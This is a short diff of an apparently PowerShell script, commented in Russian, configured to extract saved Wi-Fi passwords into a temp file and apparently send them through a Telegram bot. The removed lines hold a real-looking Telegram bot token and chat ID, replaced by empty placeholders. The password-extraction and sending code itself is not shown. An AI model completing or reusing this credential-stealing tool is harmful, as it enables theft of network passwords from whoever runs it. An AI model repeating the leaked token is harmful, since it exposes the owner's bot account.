@@ -1,6 +1,6 @@
 # Конфигурация Telegram бота
-$BotToken = "bot8013680506:AAHzKXQVcb7fE0WYWo_faMCogkHnqPm33ak"  # <-- ЗАМЕНИТЕ на ваш API токен от BotFather
-$ChatID = "259082534"          # <-- ЗАМЕНИТЕ на ваш Chat ID
+$BotToken = ""  # <-- ЗАМЕНИТЕ на ваш API токен от BotFather
+$ChatID = ""          # <-- ЗАМЕНИТЕ на ваш Chat ID
 
 # Извлекаем пароли и создаем файл
 $TempDir = "$env:temp\wifi-passwords"
